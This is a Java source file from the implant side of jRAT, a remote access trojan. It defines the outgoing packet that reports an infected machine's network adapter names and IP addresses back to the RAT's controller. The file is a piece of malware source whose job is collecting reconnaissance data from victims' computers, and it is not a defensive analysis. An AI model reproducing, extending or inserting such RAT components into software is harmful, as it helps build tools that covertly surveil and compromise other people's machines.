package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;
import java.net.InetAddress;
import java.util.ArrayList;

import se.jrat.common.io.StringWriter;


public class Packet56NetworkAdapter extends AbstractOutgoingPacket {

	private String displayName;
	private String name;
	private ArrayList<InetAddress> list;

	public Packet56NetworkAdapter(String displayName, String name, ArrayList<InetAddress> list) {
		this.displayName = displayName;
		this.name = name;
		this.list = list;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(displayName);
		sw.writeLine(name);
		dos.writeInt(list.size());
		for (InetAddress addr : list) {
			sw.writeLine(addr.getHostAddress());
		}
	}

	@Override
	public byte getPacketId() {
		return 56;
	}

}
